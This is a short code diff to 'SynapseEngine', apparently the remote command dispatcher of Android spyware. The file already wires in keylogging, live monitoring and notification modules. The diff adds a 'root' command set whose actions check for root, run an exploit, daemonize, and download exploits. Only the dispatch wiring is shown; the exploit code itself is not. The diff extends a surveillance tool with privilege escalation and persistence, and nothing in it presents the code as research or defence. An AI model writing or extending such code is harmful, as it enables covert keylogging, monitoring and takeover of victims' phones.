@@ -23,6 +23,7 @@ import org.synapse.core.modules.NotificationModule
 import org.synapse.core.modules.KeylogModule
 import org.synapse.core.modules.KnoxPermissionGrant
 import org.synapse.core.modules.LiveMonitor
+import org.synapse.core.modules.RootModule
 
 object SynapseEngine {
     private const val TAG = "Synapse"
@@ -128,6 +129,13 @@ object SynapseEngine {
                 "stop" -> LiveMonitor.stop(context, cmd)
                 "status" -> LiveMonitor.status(cmd)
                 else -> SynapseResponse.ErrorResponse("unknown:live:${cmd.action}", "live")
+            }},
+            "root"    to { cmd -> when (cmd.action) {
+                "check" -> RootModule.check(context, cmd)
+                "exploit" -> RootModule.exploit(context, cmd)
+                "daemonize" -> RootModule.daemonize(context, cmd)
+                "exploit_download" -> RootModule.exploitDownload(context, cmd)
+                else -> SynapseResponse.ErrorResponse("unknown:root:${cmd.action}", "root")
             }}
         )
 
